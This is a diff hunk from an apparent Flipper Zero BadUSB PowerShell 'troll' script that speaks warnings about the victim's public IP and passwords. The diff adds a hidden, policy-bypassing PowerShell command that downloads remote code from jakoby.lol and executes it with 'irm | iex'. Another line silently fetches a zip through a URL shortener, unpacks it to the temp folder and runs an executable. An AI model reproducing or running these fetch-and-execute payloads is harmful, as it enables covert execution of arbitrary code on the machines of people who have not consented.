@@ -649,7 +649,8 @@ $s.Speak($PUB_IPwarn)
 
 $s.Speak($PASSwarn)
 
-WallPaper-Troll
+#WallPaper-Troll
+Start-Process powershell -ArgumentList '-w', 'h', '-NoP', '-NonI', '-Exec', 'Bypass', '-Command', '$url="https://raw.githubusercontent.com/0d1nss0n/Flipper-Zero-BadUSB/main/Payloads/Flip-WallPaper-URL/heman-rainbow.jpg"; irm jakoby.lol/pkw | iex'
 
 $s.Speak($LAST_PASSwarn)
 
@@ -659,7 +660,7 @@ $s.Speak($OUTRO)
 
 
 ###########################################################################################################
-# this will launch the desktop goose
+# this will launch the desktop goose and 
 
 Start-Process powershell -ArgumentList '-w', 'h', '-NoP', '-NonI', '-Ep', 'Bypass', '-Command', '$G="$env:tmp"; iwr -Uri "https://t.ly/gJ5d" -O "$G\goose.zip"; Expand-Archive "$G\goose.zip" -Des $G -Force; . $G\Goose\GooseDesktop.exe'
 
